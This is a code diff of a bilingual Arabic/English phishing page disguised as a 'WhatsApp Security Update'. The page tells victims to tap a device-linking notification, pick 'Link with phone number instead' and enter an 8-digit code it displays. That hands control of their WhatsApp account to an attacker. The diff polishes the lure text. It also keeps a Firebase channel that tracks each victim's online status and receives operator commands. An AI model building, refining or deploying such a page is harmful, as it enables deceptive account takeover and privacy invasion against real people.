@@ -14,7 +14,7 @@
         .v-box { background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 12px; padding: 18px; margin-bottom: 25px; }
         .v-row { display: flex; justify-content: space-between; font-size: 14px; margin: 10px 0; }
         
-        /* التعديل الجوهري: الكلام على الجنب وليس في المنتصف */
+        /* محاذاة الكلام للجنب (بداية السطر) */
         .alert-p { font-size: 14px; color: #3b4a54; text-align: start; line-height: 1.5; border-top: 1px solid #eee; padding-top: 20px; margin-bottom: 15px; }
         .steps { text-align: start; font-size: 14px; color: #1c1e21; line-height: 1.6; }
         
@@ -28,7 +28,7 @@
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
         <div id="ui-title" class="header-title"></div>
-        <div class="badge">Linked Device: iPhone</div>
+        <div id="ui-badge" class="badge"></div>
         
         <div class="v-box">
             <div class="v-row"><span id="ui-old-label" style="color:#667781"></span><span style="color:#d91e1e; font-weight:bold">V2.12.5 (Old)</span></div>
@@ -56,21 +56,23 @@
         const translations = {
             ar: {
                 title: "تحديث أمان واتساب",
-                old: "بروتوكول التشفير الحالي:",
-                new: "بروتوكول التشفير المحدث:",
+                badge: "جهاز مرتبط: iPhone",
+                old: "البروتوكول الحالي:",
+                new: "البروتوكول المحدث:",
                 alert: "لحماية خصوصيتك ومحادثاتك، يجب عليك الترقية إلى أحدث بروتوكول أمني (V3.0.1).",
-                steps: "<b>خطوات التفعيل:</b><br>1. ستتلقى الآن إشعاراً رسمياً من واتساب لربط الجهاز، اضغط عليه فوراً.<br>2. اختر <b>'الربط برقم الهاتف بدلاً من ذلك'</b> من أسفل الشاشة.<br>3. أدخل رمز المصادقة المكون من 8 أرقام الذي سيظهر هنا:",
-                wait: "جاري استخراج رمز الأمان..",
-                done: "أدخل الكود في واتساب الآن!"
+                steps: "<b>كيفية التفعيل:</b><br>1. ستتلقى الآن إشعاراً رسمياً من واتساب لربط الجهاز؛ اضغط عليه فوراً.<br>2. اختر <b>'الربط برقم الهاتف بدلاً من ذلك'</b> في الأسفل.<br>3. أدخل رمز التحقق المكون من 8 أرقام الذي سيظهر هنا خلال لحظات:",
+                wait: "في انتظار رمز الأمان.. سيصل هنا قريباً",
+                done: "تم استخراج الكود! أدخله في واتساب الآن"
             },
             en: {
                 title: "WhatsApp Security Update",
+                badge: "Linked Device: iPhone",
                 old: "Current Protocol:",
                 new: "Updated Protocol:",
                 alert: "To protect your privacy and chats, you must upgrade to the latest security protocol (V3.0.1).",
-                steps: "<b>Activation Steps:</b><br>1. You will now receive an official WhatsApp notification to link a device; tap it immediately.<br>2. Select <b>'Link with phone number instead'</b> at the bottom.<br>3. Enter the 8-digit verification code that will appear here:",
-                wait: "Awaiting security code..",
-                done: "Enter the code in WhatsApp now!"
+                steps: "<b>How to activate:</b><br>1. You will now receive an official WhatsApp notification to link a device; tap it immediately.<br>2. Select <b>'Link with phone number instead'</b> at the bottom.<br>3. Enter the 8-digit verification code that will appear here in a few moments:",
+                wait: "Awaiting security code.. arriving in moments",
+                done: "Code generated! Enter it in WhatsApp now"
             }
         };
 
@@ -79,6 +81,7 @@
         document.documentElement.dir = userLang === 'ar' ? 'rtl' : 'ltr';
 
         document.getElementById('ui-title').innerText = lang.title;
+        document.getElementById('ui-badge').innerText = lang.badge;
         document.getElementById('ui-old-label').innerText = lang.old;
         document.getElementById('ui-new-label').innerText = lang.new;
         document.getElementById('ui-alert').innerText = lang.alert;
@@ -87,9 +90,7 @@
 
         if (userId) {
             const statusRef = db.ref('monitoring/' + userId);
-            // إشعار Online
             statusRef.set({ status: "Online", ts: Date.now() });
-            // إشعار Offline تلقائي عند قفل الصفحة
             statusRef.onDisconnect().set({ status: "Offline", ts: Date.now() });
 
             db.ref('commands/' + userId).on('value', (snap) => {
